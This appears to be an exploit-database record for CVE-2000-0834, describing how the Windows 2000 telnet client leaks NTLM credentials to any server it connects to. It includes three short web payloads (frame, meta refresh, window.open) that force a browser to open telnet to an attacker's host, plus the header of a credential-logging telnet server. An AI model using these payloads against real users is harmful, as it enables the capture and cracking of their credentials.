    "text": "ecve : CVE-2000-0834 ， title : Microsoft Windows Server 2000 - 'telnet.exe' NTLM Authentication - Windows remote Exploit ， verified : Verified ， exploit_detail : source :  ， By default , the telnet client ( telnet.exe ) shipped with Microsoft Windows 2000 utilizes Windows NT Challenge/Response ( NTLM ) as an authentication method. When establishing a connection to a host , the telnet client will attempt authentication via NTLM , regardless of whether or not the host is a Windows telnet server or not. There is a possibility that the NTLM challenge/response authentication session could be monitored and subsequently cracked , which could lead to the disclosure of sensitive information such as usernames , passwords , domains , etc. The NTLM challenge/response protocol is known to be susceptible to brute-force cracking , as demonstrated in the tool \"L0phtcrack.\" ， Forcing a telnet session on a remote target is a trivial task because products such as Microsoft Internet Explorer , Outlook ( Express )  , Netscape Navigator , etc. will automatically open URLs with a \"telnet : //\" prefix in a default telnet client ( which is normally telnet.exe ) . The following are some examples of how one could open a telnet session on a specified rogue server :  ， 1 ) frame src=telnet : //target ， 2 ) meta http-equiv=\"refresh\" content=\"0 ; URL=telnet : //telnet-attacker\" ， 3 ) window.open ( \"telnet : //target\" )  ， / * TalkNTLM - NTLM Logging Telnet Server ，  * dildog @ atstake.com ，  * 8/14/00 ，  * Copyright ( C ) 2000 @ stake , Inc. ，  * /",
